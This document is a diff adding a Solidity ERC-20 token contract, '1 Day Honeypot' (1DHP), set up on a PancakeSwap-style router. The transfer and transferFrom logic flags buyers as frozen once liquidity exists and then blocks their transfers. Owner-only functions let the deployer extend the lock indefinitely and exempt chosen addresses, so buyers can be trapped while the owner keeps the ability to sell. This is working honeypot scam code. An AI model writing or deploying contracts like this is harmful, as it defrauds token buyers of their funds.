@@ -1,0 +1,193 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+interface IDEXFactory {
+    function createPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+}
+
+interface IDEXRouter {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+}
+
+interface IERC20 {
+    function symbol() external view returns (string memory);
+
+    function name() external view returns (string memory);
+
+    function totalSupply() external view returns (uint256);
+
+    function decimals() external view returns (uint8);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+contract OneDayHoneyPot is IERC20 {
+    string private _name = "1 Day Honeypot";
+    string private _symbol = "1DHP";
+    uint8 private _decimals = 18;
+
+    IDEXRouter router;
+    address public pair;
+    address routerAddress;
+    address public _owner;
+
+    mapping(address => uint256) private balances;
+    mapping(address => mapping(address => uint256)) private allowances;
+    mapping(address => bool) public isFrz;
+    mapping(address => bool) public excluded;
+    uint256 public futureTimestamp;
+
+    uint256 _totalSupply = 1000000 * (10**_decimals); //1 million total supply
+
+    constructor() {
+        routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+        futureTimestamp = block.timestamp + 1 days;
+        router = IDEXRouter(routerAddress);
+        pair = IDEXFactory(router.factory()).createPair(
+            address(this),
+            router.WETH()
+        );
+
+        _owner = msg.sender;
+        balances[_owner] = _totalSupply;
+        excluded[_owner] = true;
+        excluded[pair] = true;
+        excluded[routerAddress] = true;
+
+        emit Transfer(address(0), _owner, _totalSupply);
+    }
+
+    function decimals() external view override returns (uint8) {
+        return _decimals;
+    }
+
+    function symbol() external view override returns (string memory) {
+        return _symbol;
+    }
+
+    function name() external view override returns (string memory) {
+        return _name;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return balances[account];
+    }
+
+    function approve(address spender, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender)
+        public
+        view
+        override
+        returns (uint256)
+    {
+        return allowances[owner][spender];
+    }
+
+    function transfer(address recipient, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        require(amount <= balances[msg.sender], "Insufficient balance");
+
+        if (!excluded[tx.origin]) {
+            if (
+                block.timestamp <= futureTimestamp && isFrz[tx.origin] == true
+            ) {
+                revert("Wait 24 hours..");
+            }
+        }
+
+        balances[msg.sender] -= amount;
+
+        balances[recipient] += amount;
+
+        if (IERC20(address(this)).balanceOf(pair) > 0) {
+            isFrz[msg.sender] = true;
+            isFrz[recipient] = true;
+        }
+
+        emit Transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        require(amount <= balances[sender], "Insufficient balance");
+        require(
+            amount <= allowances[sender][msg.sender],
+            "Insufficient allowance"
+        );
+
+        if (!excluded[sender]) {
+            if (block.timestamp <= futureTimestamp && isFrz[sender] == true) {
+                revert("Wait 24 hours..");
+            }
+        }
+
+        balances[sender] -= amount;
+        balances[recipient] += amount;
+        allowances[sender][msg.sender] -= amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function setExcluded(address usr, bool isExclued) public {
+        require(msg.sender == _owner, "must be owner");
+        excluded[usr] = isExclued;
+    }
+
+    function frz(address _user, bool setfrz) public {
+        require(msg.sender == _owner, "must be owner");
+        isFrz[_user] = setfrz;
+    }
+
+    function setTimestamp(uint256 _newTimestamp) public {
+        require(msg.sender == _owner, "must be owner");
+        futureTimestamp = _newTimestamp;
+    }
+}
